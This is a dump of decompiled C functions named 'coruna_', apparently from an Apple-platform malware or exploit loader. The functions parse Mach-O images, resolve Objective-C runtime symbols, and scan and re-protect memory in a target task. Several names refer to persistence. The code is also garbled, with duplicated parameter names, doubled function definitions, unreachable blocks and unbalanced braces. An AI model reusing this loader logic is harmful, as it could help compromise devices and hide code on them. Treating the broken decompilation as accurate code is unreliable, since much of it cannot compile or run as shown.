            if ((err != 0) && (err = _strncmp(buf,"__objc",6), err != 0)) {
              return 0xad017;
            }
            *(uint8_t *)(handle + 0x18) = 1;
            return 0xad017;
          }
          buf = buf + 0x50;
        } while (buf < ptr);
      }
    }
  }
  else {
    tag = 0;
  }
  return tag;
}





void coruna_block_assign(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  return;
}





void coruna_block_dispose_byref(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t
uint64_t coruna_bind_interpret(int64_t arg,int64_t arg,uint64_t val,int64_t val,int flags,uint64_t id_2)
{
  unsigned long *ptr;
  unsigned long *buf;
  ushort u;
  uint size;
  bool err;
  uint64_t version;
  uint32_t port;
  uint64_t tag;
  uint kind;
  unsigned long type_id;
  unsigned long type_id_8;
  long handle;
  unsigned long *scratch [2];
  
  version = 0xad001;
  if ((arg != 0) && (arg != 0)) {
    scratch[0] = (unsigned long *)0x0;
    version = coruna_block_dispose(arg,*(long *)(arg + 8) + (id_2 & 0xffffffff) +
                                 (unsigned long)((uint)*(ushort *)(arg + 4) * flags),scratch);
    if ((int)version == 0) {
      tag = 0x920006;
      u = *(ushort *)(arg + 6);
      version = 0x920005;
      if (u < 0xd) {
        kind = (uint)u;
        size = 1 << (unsigned long)(kind & 0x1f);
        if ((size & 0x1282) == 0) {
          if (((size & 0x44) != 0) && (version = 0xad001, scratch[0] != (unsigned long *)0x0)) {
            buf = *(unsigned long **)(arg + 8);
            ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
            version = tag;
            if (((buf <= ptr) &&
                (((buf <= scratch[0] && (scratch[0] < ptr)) &&
                 (scratch[0] < (unsigned long *)0xfffffffffffffff8)))) &&
               ((buf <= scratch[0] + 1 && (scratch[0] + 1 <= ptr)))) {
              do {
                type_id = *scratch[0];
                if ((long)type_id < 0) {
                  if ((uint)val <= (uint)(type_id & 0xffffff)) {
                    return 0x920001;
                  }
                  type_id_8 = *(long *)(val + (type_id & 0xffffff) * 8) + (type_id >> 0x18 & 0xff);
                }
                else {
                  if (kind == 2) {
                    handle = *(long *)(arg + 0x50);
                  }
                  else {
                    handle = *(long *)(arg + 0x40);
                  }
                  type_id_8 = handle + (type_id & 0xfffffffff | (type_id >> 0x24) << 0x38);
                }
                *scratch[0] = type_id_8;
                if ((type_id >> 0x33 & 0xfff) == 0) {
                  return 0;
                }
                buf = *(unsigned long **)(arg + 8);
                ptr = (unsigned long *)(*(long *)(arg + 0x10) + (long)buf);
                if (ptr < buf) {
                  return 0x920006;
                }
                scratch[0] = (unsigned long *)((long)scratch[0] +
                                       (unsigned long)(((uint)(type_id >> 0x33) & 0xfff) << 2));
                err = scratch[0] < buf;
              } while (((((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                         scratch[0] < (unsigned long *)0xfffffffffffffff7 ||
                        ((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                        scratch[0] == (unsigned long *)0xfffffffffffffff7) && buf <= scratch[0] + 1) &&
                       scratch[0] + 1 <= ptr);
            }
          }
        }
        else {
          port = 4;
          if (u != 7) {
            port = 8;
          }
          version = coruna_return_zero_15594(arg,val,val,scratch[0],kind != 1,port,kind == 0xc);
        }
      }
    }
  }
  return version;
}





uint64_t coruna_objc_resolve_method(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  
  u = 0xad001;
  if ((((handle != 0) && (handle = *(long *)(handle + 0x38), handle != 0)) &&
      (*(long *)(handle + 0x40) != 0)) && ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) {
    if ((flags == 0x3c) || (flags == 0x28)) {
      size = *(uint64_t *)(addr_2 + 8);
      bootargs = 0;
      scratch = 0;
      scratch = size;
      if (((*(int *)(handle + 0x50) != 2) || (flags != 0x28)) ||
         (u = coruna_persist_via_persist_via_macho_open_image(handle,handle,handle + 0x58), (int)u == 0)) {
        if (flags == 0x28) {
          (**(void (**)(handle + 0x40))(1,&bootargs,&scratch);
          if (*(int *)(handle + 0x50) == 1) {
            coruna_find_data_dirty(handle);
          }
        }
        else {
          (**(void (**)(handle + 0x48))(0,size);
        }
        u = 0;
      }
    }
    else {
      u = 0x1800b;
    }
  }
  return u;
}





uint32_t coruna_find_data_dirty(long handle)
{
  int err;
  byte err;
  int status;
  uint32_t u;
  long handle;
  long addr;
  int *err;
  unsigned long size;
  int flags;
  int *status;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    err = *(int *)(handle + 0x10);
    u = 0x18006;
    if (err != 0) {
      err = 0;
      flags = 0;
      handle = 0;
      addr = 0;
      status = (int *)(handle + 0x20);
      do {
        if (*status == 0x19) {
          status = _strcmp((char *)(status + 2),"__TEXT");
          if (status == 0) {
            handle = handle - *(long *)(status + 6);
            err = 1;
          }
          else {
            status = _strcmp((char *)(status + 2),"__DATA_DIRTY");
            if ((status == 0) && (size = (unsigned long)(uint)status[0x10], status[0x10] != 0)) {
              err = status + 0x12;
              do {
                status = _strcmp((char *)err,"__common");
                if (status == 0) {
                  addr = handle + *(long *)(err + 8);
                }
                err = err + 0x14;
                size = size - 1;
              } while (size != 0);
            }
          }
        }
        status = (int *)((long)status + (unsigned long)(uint)status[1]);
        flags = flags + 1;
      } while (flags != err);
      u = 0x1800c;
      if (!(bool)(err & addr != 0)) {
        u = 0x18006;
      }
    }
  }
  return u;
}
uint64_t coruna_objc_patch_images(long handle)
{
  bool err;
  unsigned long u;
  unsigned long size;
  uint32_t version;
  char *ptr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  bool status;
  bool flags;
  bool count;
  bool idx;
  bool i;
  int err;
  long handle;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  uint64_t type_id_9;
  uint type_id_10;
  uint32_t type_id_11;
  int *err;
  unsigned long *ptr;
  long off;
  unsigned long type_id_12;
  unsigned long *buf;
  unsigned long type_id_13;
  uint64_t type_id_14;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info [6];
  unsigned long *serial_buf;
  
  if (handle == 0) {
    return 0xad001;
  }
  type_id_14 = 0x18008;
  handle = _dlopen("/usr/lib/libobjc.A.dylib",2);
  if (handle == 0) {
    return 0x18004;
  }
  host_info[2] = 0;
  host_info[1] = 0;
  host_info[4] = 0;
  host_info[3] = 0;
  addr = _dlsym(handle,"object_getClass");
  type_id = _dlsym(handle,"_objc_patch_root_of_class");
  type_id_8 = _dlsym(handle,"_objc_map_images");
  if (addr == 0) {
    type_id_9 = 0x18002;
  }
  else {
    err = _dladdr(addr,host_info + 1);
    kind = host_info[2];
    type_id_9 = 0x18003;
    if ((err != 0) && (host_info[2] != 0)) {
      thread_attr = 0;
      host_info[0] = 0;
      type_id_9 = coruna_macho_text_seg("__TEXT","__text",host_info[2],host_info,&thread_attr);
      tag = host_info[0];
      addr = thread_attr;
      if ((int)type_id_9 == 0) {
        err = *(int *)(kind + 0x10);
        if (err != 0) {
          err = (int *)(kind + 0x20);
          do {
            if (*err == 0x25) {
              off = 8;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_persist_via_macho_open_image(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            if (*err == 0x32) {
              off = 0xc;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              count = host_info[0] == 0;
              idx = thread_attr == 0;
              type_id_13 = bootargs;
              bootargs = type_id_13;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((count || idx) ||
              (type_id_9 = coruna_persist_via_macho_open_image(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        type_id_9 = 0x18009;
      }
    }
  }
  _dlclose(handle);
  return type_id_9;
}





uint64_t coruna_mutex_destroy(long handle)
{
  if (handle != 0) {
    if (*(int *)(handle + 0x50) == 2) {
      _pthread_mutex_destroy((pthread_mutex_t *)(handle + 0x58));
      *(uint64_t *)(handle + 0x60) = 0;
      *(uint64_t *)(handle + 0x58) = 0;
      *(uint64_t *)(handle + 0x70) = 0;
      *(uint64_t *)(handle + 0x68) = 0;
      *(uint64_t *)(handle + 0x80) = 0;
      *(uint64_t *)(handle + 0x78) = 0;
      *(uint64_t *)(handle + 0x90) = 0;
      *(uint64_t *)(handle + 0x88) = 0;
      *(uint64_t *)(handle + 0xa0) = 0;
      *(uint64_t *)(handle + 0x98) = 0;
      *(uint64_t *)(handle + 0xa8) = 0;
    }
    *(uint64_t *)(handle + 0xa8) = 0;
    *(uint64_t *)(handle + 0x90) = 0;
    *(uint64_t *)(handle + 0x88) = 0;
    *(uint64_t *)(handle + 0xa0) = 0;
    *(uint64_t *)(handle + 0x98) = 0;
    *(uint64_t *)(handle + 0x70) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
    *(uint64_t *)(handle + 0x80) = 0;
    *(uint64_t *)(handle + 0x78) = 0;
    *(uint64_t *)(handle + 0x50) = 0;
    *(uint64_t *)(handle + 0x48) = 0;
    *(uint64_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x58) = 0;
    *(uint64_t *)(handle + 0x30) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    *(uint64_t *)(handle + 0x40) = 0;
    *(uint64_t *)(handle + 0x38) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_objc_metaclass_prefix(long *handle)
{
  int err;
  int status;
  uint64_t u;
  long handle;
  char *ptr;
  long addr;
  unsigned long size;
  long off;
  
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
  else {
    addr = 0;
    handle = *handle;
    size = 0xffffffffffffffff;
    do {
      size = size + 1;
      if (*(uint *)(handle + 0x16) <= size) {
        return 0;
      }
      off = handle[0x15];
      ptr = *(char **)(off + addr);
      err = _strncmp(ptr,"_OBJC_CLASS_$_",0xe);
      if ((err == 0) || (status = _strncmp(ptr,"_OBJC_METACLASS_$_",0x12), status == 0)) {
        u = coruna_objc_nsobject_pair(handle,handle + 0x28,*(uint64_t *)(off + addr + 8),err != 0);
      }
      else {
        u = 0;
      }
      addr = addr + 0x10;
    } while ((int)u == 0);
  }
  return u;
}





int coruna_objc_nsobject_pair(long handle,long *addr_2,uint64_t *val,unsigned long arg)
{
  uint64_t *ptr;
  unsigned long *buf;
  uint64_t *str;
  uint64_t *copy;
  unsigned long u;
  uint64_t size;
  int err;
  uint64_t version;
  long handle;
  unsigned long port;
  
  err = 0xad001;
  if (((handle != 0) && (addr_2 != (long *)0x0)) &&
     (*addr_2 != 0 && val != (uint64_t *)0x0)) {
    handle = 0;
    port = 0;
    ptr = val + 5;
    err = 0xad011;
    while (err == 0xad011) {
      if (*(uint *)(handle + 0x88) <= port) {
        return 0xad011;
      }
      buf = (unsigned long *)(*(long *)(handle + 0x80) + handle);
      copy = (uint64_t *)*buf;
      u = buf[1];
      str = (uint64_t *)((long)copy + u);
      port = port + 1;
      err = 0;
      if (((((ptr > str || copy > ptr) || str <= val) || copy > val) ||
          u == 0xffffffffffffffff) ||
          (((ptr <= str && copy <= ptr) && val < str) && copy <= val) &&
          (long)u < -1) {
        err = 0xad011;
      }
      handle = handle + 0x18;
    }
    if (err == 0) {
      size = _dlsym(*addr_2,"OBJC_METACLASS_$_NSObject");
      *val = size;
      if ((arg & 1) == 0) {
        size = _dlsym(*addr_2,"OBJC_CLASS_$_NSObject");
      }
      val[1] = size;
      size = _dlsym(*addr_2,"_objc_empty_cache");
      val[2] = size;
      size = _dlsym(*addr_2,"_objc_empty_vtable");
      err = 0;
      version = *(uint64_t *)(handle + 8);
      val[3] = size;
      val[4] = version;
    }
  }
  return err;
}





uint64_t coruna_objc_scan_methlist(long handle,long addr_2)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  u = 0xad001;
  if (((((handle != 0) && (*(long *)(handle + 0x38) != 0)) && (*(long *)(handle + 0x40) != 0)) &&
      ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) &&
     ((*(char *)(addr_2 + 0xfc) != '\0' &&
      ((u = 0, (*(ushort *)(addr_2 + 0x1c0) >> 8 & 1) != 0 &&
       (*(uint *)(handle + 0x30) >> 0x11 < 7)))))) {
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_find_objc_methlist;
    host_info = &k_persist_rodata_word_20828;
    serial_buf = addr_2;
    u = coruna_macho_foreach_loadcmd(addr_2,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_objc_metaclass_prefix(long handle,long addr_2)
{
  int err;
  uint64_t u;
  char *ptr;
  long handle;
  unsigned long size;
  long addr;
  
  u = 0xad001;
  if (((((handle != 0) && (*(long *)(handle + 0x38) != 0)) && (*(long *)(handle + 0x40) != 0)) &&
      ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) && (*(char *)(addr_2 + 0xfc) != '\0'))
  {
    handle = 0;
    size = 0xffffffffffffffff;
    do {
      size = size + 1;
      if (*(uint *)(addr_2 + 0xb0) <= size) {
        return 0;
      }
      addr = *(long *)(addr_2 + 0xa8);
      ptr = *(char **)(addr + handle);
      err = _strncmp(ptr,"_OBJC_CLASS_$_",0xe);
      if ((err == 0) || (err = _strncmp(ptr,"_OBJC_METACLASS_$_",0x12), err == 0)) {
        u = coruna_persist_residual_46(addr_2,handle + 0x28,*(uint64_t *)(addr + handle + 8));
      }
      else {
        u = 0;
      }
      handle = handle + 0x10;
    } while ((int)u == 0);
  }
  return u;
}





int coruna_persist_residual_46(long handle,long *addr_2,unsigned long *arg)
{
  unsigned long *ptr;
  unsigned long *buf;
  unsigned long *str;
  unsigned long u;
  int err;
  long handle;
  unsigned long size;
  
  err = 0xad001;
  if (((handle != 0) && (addr_2 != (long *)0x0)) && (*addr_2 != 0 && arg != (unsigned long *)0x0)) {
    handle = 0;
    size = 0;
    ptr = arg + 5;
    err = 0xad011;
    while (err == 0xad011) {
      if (*(uint *)(handle + 0x88) <= size) {
        return 0xad011;
      }
      buf = (unsigned long *)(*(long *)(handle + 0x80) + handle);
      str = (unsigned long *)*buf;
      u = buf[1];
      buf = (unsigned long *)((long)str + u);
      size = size + 1;
      err = 0;
      if (((((ptr > buf || str > ptr) || buf <= arg) || str > arg) ||
          u == 0xffffffffffffffff) ||
          (((ptr <= buf && str <= ptr) && arg < buf) && str <= arg) &&
          (long)u < -1) {
        err = 0xad011;
      }
      handle = handle + 0x18;
    }
    if (err == 0) {
      if ((*arg & 0x7ffffffffffff8) != 0) {
        *arg = *arg;
      }
      size = arg[1];
      if (size == 0) {
        err = 0;
      }
      else {
        err = 0;
        arg[1] = size;
      }
    }
  }
  return err;
}





uint64_t coruna_macho_text_seg(char *path,char *str_2,long handle,long *addr_2,uint64_t *val)
{
  uint64_t u;
  int err;
  int status;
  uint64_t size;
  int *err;
  int *status;
  int flags;
  int *flags;
  unsigned long version;
  int *count;
  int *idx;
  
  size = 0x18006;
  err = *(int *)(handle + 0x10);
  if (err != 0) {
    err = (int *)0x0;
    flags = 0;
    flags = (int *)(handle + 0x20);
    count = (int *)0x0;
    do {
      idx = count;
      if ((count != (int *)0x0) && (err != (int *)0x0)) break;
      if (*flags == 0x19) {
        status = _strcmp((char *)(flags + 2),"__TEXT");
        idx = flags;
        if (status != 0) {
          idx = count;
        }
        if (err == (int *)0x0) {
          status = _strcmp((char *)(flags + 2),path);
          if ((status == 0) && (version = (unsigned long)(uint)flags[0x10], flags[0x10] != 0)) {
            count = flags + 0x12;
            status = (int *)0x0;
            do {
              status = _strcmp((char *)count,str_2);
              err = count;
              if (status != 0) {
                err = status;
              }
              count = count + 0x14;
              version = version - 1;
              status = err;
            } while (version != 0);
          }
          else {
            err = (int *)0x0;
          }
        }
      }
      flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
      flags = flags + 1;
      count = idx;
    } while (flags != err);
    size = 0x18006;
    if ((idx != (int *)0x0) && (err != (int *)0x0)) {
      size = 0;
      u = *(uint64_t *)(err + 10);
      *addr_2 = (handle - *(long *)(idx + 6)) + *(long *)(err + 8);
      *val = u;
    }
  }
  return size;
}





uint64_t coruna_dladdr(unsigned long arg,int flags,long handle,long addr_2,unsigned long *arg)
{
  int err;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long bootargs;
  
  size = 0xad001;
  if (((arg != 0) && (handle != 0)) && (arg != (unsigned long *)0x0)) {
    size = 0x18005;
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    u = arg;
    while (arg < (unsigned long)(handle + addr_2)) {
      err = _dladdr(arg,&scratch);
      version = arg;
      if ((err != 0) && (u != bootargs)) {
        flags = flags + -1;
        if (flags == 0) {
          *arg = bootargs;
          return 0;
        }
        u = bootargs;
        version = bootargs;
        if (bootargs <= arg) {
          version = arg;
        }
      }
      arg = version + 1;
    }
  }
  return size;
}
uint coruna_find_objc_methlist(long handle,long addr_2)
{
  uint u;
  bool err;
  int err;
  unsigned long size;
  unsigned long version;
  
  err = _strcmp((char *)(addr_2 + 8),"__TEXT");
  if ((err == 0) &&
     (size = addr_2 + 0x48U + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50, addr_2 + 0x48U < size)) {
    version = addr_2 + 0x98;
    do {
      err = _strcmp((char *)(version - 0x50),"__objc_methlist");
      if ((err == 0) &&
         (u = *(int *)(*(long *)(*(long *)(handle + 0x20) + 0x18) + *(long *)(version - 0x30)) >>
                  0x1f & 0x18014, u != 0)) {
        return u;
      }
      err = version < size;
      version = version + 0x50;
    } while (err);
  }
  return 0;
}





uint coruna_vm_region_recurse(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint *size,
                 uint8_t *buf,long addr_2)
{
  uint u;
  bool err;
  uint size;
  kern_return_t lk4;
  uint8_t version;
  natural_t scratch;
  mach_msg_type_number_t bootargs;
  unsigned long thread_attr [5];
  short host_info;
  uint64_t scratch;
  mach_vm_size_t serial_buf;
  mach_vm_address_t action;
  
  serial_buf = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  scratch = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  bootargs = 0xc;
  size = 0xad001;
  if (((size != (uint *)0x0) && (buf != (uint8_t *)0x0)) && (addr_2 != 0)) {
    scratch = 1;
    action = arg_x;
    size = _mach_vm_region_recurse
                      (arg,&action,&serial_buf,&scratch,(vm_region_recurse_info_t)thread_attr,
                       &bootargs);
    if (size == 0) {
      u = (uint)thread_attr[0];
      err = host_info != 0;
      size = (uint)thread_attr[0] >> 2 & 1;
      version = (uint8_t)size;
      if ((serial_buf + action < handle + arg_x) && (((uint)thread_attr[0] >> 2 & 1) == 0)) {
        do {
          version = (uint8_t)size;
          scratch = 1;
          bootargs = 0xc;
          lk4 = _mach_vm_region_recurse
                            (arg,&action,&serial_buf,&scratch,
                             (vm_region_recurse_info_t)thread_attr,&bootargs);
          if (lk4 != 0) break;
          size = (uint)thread_attr[0] >> 2 & 1;
          version = (uint8_t)size;
          action = action + serial_buf;
        } while (action + serial_buf < handle + arg_x && (thread_attr[0] & 4) == 0);
      }
      size = 0;
      *size = u;
      *buf = version;
      *(bool *)addr_2 = err;
    }
    else {
      size = size | 0x80000000;
    }
  }
  return size;
}





unsigned long coruna_mach_vm_protect(long arg,long val,unsigned long n,mach_vm_address_t m,
                  mach_vm_size_t p,uint q)

{
  uint32_t u;
  uint size;
  unsigned long version;
  void (*data)(void);
  vm_map_t target_task;
  unsigned long cache_54;
  mach_vm_address_t cache_82;
  mach_vm_size_t host_info;
  uint serial_buf;
  uint32_t cache_55;
  uint32_t cache_33;
  uint64_t action;
  uint16_t cache_91;
  uint cache_89;
  
  if (arg == 0) {
    return 0xad001;
  }
  if (*(long *)(arg + 0x28) == 0 || val == 0) {
    return 0xad001;
  }
  cache_89 = 0;
  cache_91 = 0;
  version = coruna_vm_region_recurse(n,m,p,&cache_89,(long)&cache_91 + 1,&cache_91);
  if ((int)version != 0) {
    return version;
  }
  target_task = (vm_map_t)n;
  if ((q >> 2 & 1) == 0) {
    if (cache_91 != '\0') {
      data = *(void (**)(arg + 0x28);
      if (data == (void (*)0x0) {
        version = 0xad001;
        (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
        return version;
      }
      serial_buf = 0;
      u = 0x40000012;
      cache_55 = 1;
      cache_54 = n & 0xffffffff;
      cache_82 = m;
      host_info = p;
      version = (*data)(arg,val,u,&cache_54);
      (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
      return version;
    }
    size = _mach_vm_protect(target_task,m,p,0,q);
    version = (unsigned long)(size | 0x80000000);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return version;
load_ok_19:
    version = 0;
  }
  else {
    serial_buf = cache_89;
    data = *(void (**)(arg + 0x28);
    u = 0x40000021;
load_ok_17:
    cache_55 = 1;
    cache_54 = n & 0xffffffff;
    cache_82 = m;
    host_info = p;
    version = (*data)(arg,val,u,&cache_54);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return version;
    size = _mach_vm_protect(target_task,m,p,0,q);
    if (size != 0) {
load_ok_18:
      version = (unsigned long)(size | 0x80000000);
      (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
      return version;
    }
    version = 0;
    }
    else {
    serial_buf = cache_89;
    data = *(void (**)(arg + 0x28);
    u = 0x40000021;
    cache_55 = 1;
    cache_54 = n & 0xffffffff;
    cache_82 = m;
    host_info = p;
    version = (*data)(arg,val,u,&cache_54);
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return version;
    version = 0xad001;
    (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
    return version;
    cache_54 = n & 0xffffffff;
    cache_55 = 1;
    cache_82 = m;
    host_info = p;
    serial_buf = q;
    version = (**(void (**)(arg + 0x28))(arg,val,0x4000000e,&cache_54);
  }
  if (k_persist_rodata_word_1f028 <= *(double *)k_persist_dyldversionnumber_slot && (int)version == 0) {
    cache_54 = coruna_u64_pack((cache_54), (target_task));
    serial_buf = serial_buf & 0xffffff00;
    action = 0;
    cache_55 = 0;
    cache_33 = 0;
    cache_82 = m;
    host_info = p;
    version = (**(void (**)(arg + 0x28))(arg,val,0xc0000023,&cache_54);
    if ((int)version == 0) {
      if ((char)serial_buf == '\0') {
        version = 0;
      }
      else {
        serial_buf = serial_buf & 0xffffff00;
        version = (**(void (**)(arg + 0x28))(arg,val,0x40000023,&cache_54);
      }
    }
  }
load_ok_16:
  (**(void (**)(arg + 0x28))(arg,val,0xc,n & 0xffffffff);
  return version;
}





uint64_t
uint64_t coruna_persist_via_vm_region_recurse(int64_t arg,int64_t arg,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t u;
  uint64_t size;
  uint16_t scratch;
  uint bootargs;
  unsigned long thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long host_info;
  
  size = 0xad001;
  u = size;
  if ((arg != 0) && (*(void (**)(arg + 0x28) != (void (*)0x0 && arg != 0)) {
    bootargs = 0;
    scratch = 0;
    u = (**(void (**)(arg + 0x28))(arg,arg,0xc,val & 0xffffffff);
    if (((int)u == 0) &&
       (u = coruna_vm_region_recurse(val,id_2,size_3,&bootargs,(long)&scratch + 1,&scratch),
       (int)u == 0)) {
      if (scratch == '\0') {
        u = 0;
      }
      else {
        if ((char)scratch == '\0') {
          size = 0x12013;
        }
        else if (*(void (**)(arg + 0x28) != (void (*)0x0) {
          thread_attr = val & 0xffffffff;
          host_info = (unsigned long)bootargs;
          scratch = id_2;
          bootargs = size_3;
          size = (**(void (**)(arg + 0x28))(arg,arg,0x4000000e,&thread_attr);
        }
        (**(void (**)(arg + 0x28))(arg,arg,0xc,val & 0xffffffff);
        u = size;
      }
    }
  }
  return u;
}





int coruna_macho_validate_header(long *handle)
{
  ushort u;
  ushort size;
  ushort version;
  uint port;
  int *err;
  
  if (((handle == (long *)0x0) || (err = (int *)handle[0x29], err == (int *)0x0)) ||
     (*handle == 0)) {
    return 0xad001;
  }
  if ((unsigned long)handle[0x2a] < 0x20) {
    return 0x13001;
  }
  if (*err == -0x1120531) {
    if ((unsigned long)handle[0x2a] < (unsigned long)(uint)err[5] + 0x20) {
      port = 0x6002;
    }
    else if (err[1] == 0x100000c) {
      port = err[2];
      if (((port & 0xffffff) < 3) || (*(char *)((long)handle + 0x1c2) != '\0')) {
        if ((((uint)err[6] >> 0x17 & 1) == 0) || (*(char *)((long)handle + 0x1c2) != '\0')) {
          u = *(ushort *)(handle + 0x38);
          version = u & 0x1f | (ushort)(((uint)err[6] >> 5 & 1) << 5);
          size = u & 0xffc0 | version;
          *(ushort *)(handle + 0x38) = size;
          if (1 < (port & 0xffffff)) {
            *(ushort *)(handle + 0x38) = size | 0x80;
            *(uint8_t *)(handle + 0x22) = 1;
            *(ushort *)(handle + 0x38) =
                 (ushort)((uint)err[2] >> 0x17) & 0x100 | u & 0xfec0 | version | 0x80;
          }
          handle[0x2e] = (long)err;
          handle[0x21] = (unsigned long)(uint)err[5] + 0x20;
          return 0;
        }
        port = 0x6006;
      }
      else {
        port = 0x6004;
      }
    }
    else {
      port = 0x6003;
    }
  }
  else {
    port = 0x6001;
  }
  return (port | 0xfff60000) + 0xad001;
}





uint64_t coruna_macho_foreach_loadcmd(long handle,int flags,long addr_2)
{
  int *err;
  uint u;
  uint64_t size;
  int *status;
  int *flags;
  long handle;
  int *count;
  uint version;
  
  size = 0xad001;
  if ((((handle != 0) && (*(long *)(handle + 0x170) != 0)) &&
      (flags = *(int **)(handle + 0x148), flags != (int *)0x0)) &&
     ((handle = *(long *)(handle + 0x150), handle != 0 && (addr_2 != 0)))) {
    u = *(uint *)(*(long *)(handle + 0x170) + 0x10);
    if (u == 0) {
      size = 0;
    }
    else {
      if (((-1 < handle) && (status = flags + 8, flags <= status)) &&
         ((count = (int *)((long)flags + handle), status < count &&
          ((flags <= flags + 10 && (flags + 10 <= count)))))) {
        version = 1;
        while (err = (int *)((long)status + (unsigned long)(uint)status[1]),
              flags <= err && err <= count) {
          if ((flags == 0) || (*status == flags)) {
            size = (**(void (**)(addr_2 + 0x10))(addr_2);
            if ((int)size != 0) {
              return size;
            }
          }
          else {
            size = 0;
          }
          if (u <= version) {
            return size;
          }
          if ((((*(long *)(handle + 0x150) < 0) ||
               (flags = *(int **)(handle + 0x148), err < flags)) ||
              (count = (int *)((long)flags + *(long *)(handle + 0x150)), count <= err)) ||
             ((err + 2 < flags || (version = version + 1, status = err, count < err + 2))))
          break;
        }
      }
      size = 0x14009;
    }
  }
  return size;
}





int coruna_block_dispose(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t scratch;
  long action;
  uint64_t block_ctx;
  uint64_t *stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  status = 0xad001;
  if ((handle != 0) && (id_2 != (uint64_t *)0x0)) {
    serial_buf = &block_ctx;
    block_ctx = 0;
    sa_saved = k_persist_rodata_word_1ef78;
    sa_new = 0;
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1ef80;
    thread_attr = coruna_macho_pagezero;
    host_info = &k_persist_rodata_word_20848;
    scratch = val;
    action = handle;
    stack_guard = serial_buf;
    err = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    if (err == 0xad017) {
      *id_2 = stack_guard[3];
      status = 0;
    }
    else {
      status = 0xad011;
      if (err != 0) {
        status = err;
      }
    }
    __Block_object_dispose(&block_ctx,8);
  }
  return status;
}





uint32_t coruna_macho_pagezero(long handle,long addr_2)
{
  unsigned long u;
  int err;
  unsigned long size;
  
  size = *(unsigned long *)(addr_2 + 0x30);
  if (size != 0) {
    err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
    if (err == 0) {
      return 0;
    }
    u = *(unsigned long *)(handle + 0x28) - *(unsigned long *)(addr_2 + 0x28);
    if ((*(unsigned long *)(addr_2 + 0x28) <= *(unsigned long *)(handle + 0x28)) && (u < size)) {
      *(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) =
           *(long *)(addr_2 + 0x18) + u + *(long *)(*(long *)(handle + 0x30) + 0x18);
      return 0xad017;
    }
  }
  return 0;
}





uint64_t
uint64_t coruna_macho_get_slide(int64_t *arg,uint64_t val,uint64_t id_2,uint64_t size_3, uint8_t *buf)
{
  uint64_t u;
  uint8_t size;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)arg + 0x1d) == '\0') {
    u = 0;
  }
  else {
    if ((*arg == 0) || (arg[1] == 0)) {
      size = 0;
      u = 0;
      if (buf != (uint8_t *)0x0) {
      u = 0;
      *buf = size;
      }
      return u;
    }
    u = coruna_persist_via_vm_region_recurse(*arg,arg[1],val,id_2,size_3);
  }
  size = 1;
  if ((int)u != 0) {
    return u;
  }
fail:
  if (buf != (uint8_t *)0x0) {
    u = 0;
    *buf = size;
  }
  return u;
